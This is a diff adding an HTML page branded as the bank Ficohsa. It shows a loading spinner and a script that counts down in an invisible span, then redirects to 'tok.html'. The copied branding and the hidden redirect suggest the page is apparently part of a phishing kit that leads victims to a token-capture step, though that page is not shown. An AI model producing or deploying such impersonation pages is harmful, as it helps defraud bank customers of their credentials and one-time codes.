@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html class="notranslate" translate="no">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Ficohsa</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+
+<link rel="shortcut icon" href="archivos/isotipo-ficohsa-blanco.ico" type="image/x-icon"><!-- #region prisma -->
+<link href="./archivos/styles.51e99432b305f59675e0.bundle.css" rel="stylesheet">
+
+
+		
+		 <script type="text/javascript">
+    
+			   
+						var tiempo=3;
+						  var url="tok.html";
+					 
+						function updateReloj()
+						{
+							document.getElementById('contador').innerHTML = " "+tiempo+" ";
+					 
+							if(tiempo==0)
+							{
+								window.location=url;
+																			
+							}else{
+								tiempo-=1;
+								setTimeout("updateReloj()",1000);
+							}
+						}
+					   window.onload=updateReloj;
+            </script>
+ </head>   
+<body>
+<icb-app class="app"></icb-app><div class="app_overlay"><!-- MERGE: El loading se carga aquí --><div class="mesina-loader">
+
+<div class="mesina-logo"></div><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div>
+<div class="mesina-welcome-title">  <span style="color:transparent;" id="contador"></span>  </div><div class="mesina-welcome-subtitle1">  </div></div></div>
+
+
+</body></html>
